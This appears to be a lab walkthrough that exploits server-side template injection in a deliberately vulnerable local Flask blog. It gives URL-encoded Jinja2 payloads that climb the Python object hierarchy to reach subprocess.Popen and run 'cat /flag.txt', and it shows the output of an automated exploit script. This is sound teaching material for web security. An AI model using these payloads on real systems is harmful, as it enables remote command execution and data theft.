# Walkthrough: SSTI

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8080/
```

Output:
```json
{
  "app": "Flask Blog v1.0 (dev)",
  "note": "SSTI: user input is rendered directly into template strings"
}
```

## Step 1: Confirm SSTI

Send a Jinja2 arithmetic expression in the `name` parameter:

```bash
curl "http://localhost:8080/render?name=%7B%7B7*7%7D%7D"
```

Output:
```json
{"output": "49"}
```

The server evaluated `{{7*7}}`. Input is rendered as a template expression.

## Step 2: Enumerate Subclasses

Walk the Python object hierarchy to reach `object.__subclasses__()`:

```bash
curl "http://localhost:8080/render?name=%7B%7B''.__class__.__mro__%5B1%5D.__subclasses__()%7D%7D"
```

Output (truncated):
```json
{"output": "[<class 'type'>, <class 'weakref'>, ... <class 'subprocess.Popen'>, ...]"}
```

Find `subprocess.Popen` in the list and note its index (80 in this lab).

## Step 3: Execute a Command

Call `subprocess.Popen` with `cat /flag.txt`:

```bash
curl "http://localhost:8080/render?name=%7B%7B''.__class__.__mro__%5B1%5D.__subclasses__()%5B80%5D('cat%20/flag.txt'%2Cshell%3DTrue%2Cstdout%3D-1).communicate()%5B0%5D%7D%7D"
```

Output:
```json
{"output": "POC{...}"}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080

[*] Step 1: arithmetic probe {{7*7}}
    Result: 49 - SSTI confirmed

[*] Step 2: enumerating subclasses via __subclasses__()
    subprocess.Popen at index 80

[*] Step 3: executing cat /flag.txt via Popen

[+] Flag: POC{...}
```
